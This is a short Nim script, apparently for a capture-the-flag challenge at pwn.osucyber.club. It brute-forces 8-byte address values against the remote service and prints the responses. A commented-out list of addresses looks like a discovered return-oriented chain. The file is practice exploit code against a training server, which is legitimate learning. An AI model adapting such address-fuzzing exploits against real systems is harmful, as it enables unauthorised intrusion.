import
  net,
  nativesockets,
  strutils,
  os,
  random,
  times

randomize()

var socketHandle = createNativeSocket()
var socket = newSocket(socketHandle)
socket.connect("pwn.osucyber.club", Port(13371))
socketHandle.setBlocking(false)

# var payloads = [
#   0x427f9a,
#   0x428167,
#   0x428233,
#   0x4281ec,
#   0x428253,
#   0x4281ec,
#   0x428273,
#   0x4281ec,
#   0x428293,
#   0x4281ec,
#   0x428233,
#   0x4281ec,
#   0x428253,
#   0x4281ec,
#   0x428273,
#   0x4281ec,
#   0x428293,
#   0x4281ec,
#   0x428210,
#   0x42800a
# ]

var buf: array[512, char]

for fuzz in 0x427000 .. 0x428300:
  var payload = fuzz.uint32().htonl().uint64()
  discard socket.send(payload.addr, 8)

  var nRecv = socket.recv(buf[0].addr, 512)
  for i in 0 ..< nRecv:
    discard stdout.writeChars(buf, 0, nRecv)

  sleep(5)

socket.close()

echo "done"
